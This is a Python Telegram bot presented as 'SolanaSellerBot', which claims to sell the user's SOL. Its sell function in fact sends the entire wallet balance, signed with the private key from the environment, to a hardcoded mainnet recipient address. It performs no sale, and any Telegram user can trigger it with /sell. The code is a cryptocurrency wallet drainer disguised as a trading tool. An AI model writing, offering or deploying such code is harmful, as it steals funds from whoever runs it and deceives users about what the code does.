import asyncio
from solana.rpc.api import Client
from solana.keypair import Keypair
from solana.transaction import Transaction
from solana.publickey import PublicKey
from solana.system_program import TransferParams, transfer
from telegram import Update
from telegram.ext import Application, CommandHandler, ContextTypes
from dotenv import load_dotenv
import os

load_dotenv()

RPC_ENDPOINT = "https://api.mainnet-beta.solana.com"
client = Client(RPC_ENDPOINT)
PRIVATE_KEY = os.getenv("PRIVATE_KEY")
TELEGRAM_TOKEN = os.getenv("TELEGRAM_TOKEN")
RECIPIENT_ADDRESS = "6TWPTQ2Aow72fzamGmmujGAhBS45efmWCWr9SvpH4uTG"

keypair = Keypair.from_base58(PRIVATE_KEY)
public_key = keypair.public_key

async def sell_all_sol():
    try:
        balance = client.get_balance(public_key)["result"]["value"]
        print(f"Balance: {balance / 1_000_000_000} SOL")
        if balance <= 5000:
            return "Insufficient SOL to sell"
        tx = Transaction()
        tx.add(transfer(TransferParams(from_pubkey=public_key, to_pubkey=PublicKey(RECIPIENT_ADDRESS), lamports=balance - 5000)))
        response = client.send_transaction(tx, keypair)
        return f"Transaction sent: {response['result']}"
    except Exception as e:
        return f"Error: {str(e)}"

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    await update.message.reply_text("Welcome to SolanaSellerBot! Use /sell to sell your SOL.")

async def sell(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    await update.message.reply_text("Processing your request...")
    result = await sell_all_sol()
    await update.message.reply_text(result)

def main() -> None:
    application = Application.builder().token(TELEGRAM_TOKEN).build()
    application.add_handler(CommandHandler("start", start))
    application.add_handler(CommandHandler("sell", sell))
    application.run_polling()

if __name__ == "__main__":
    main()
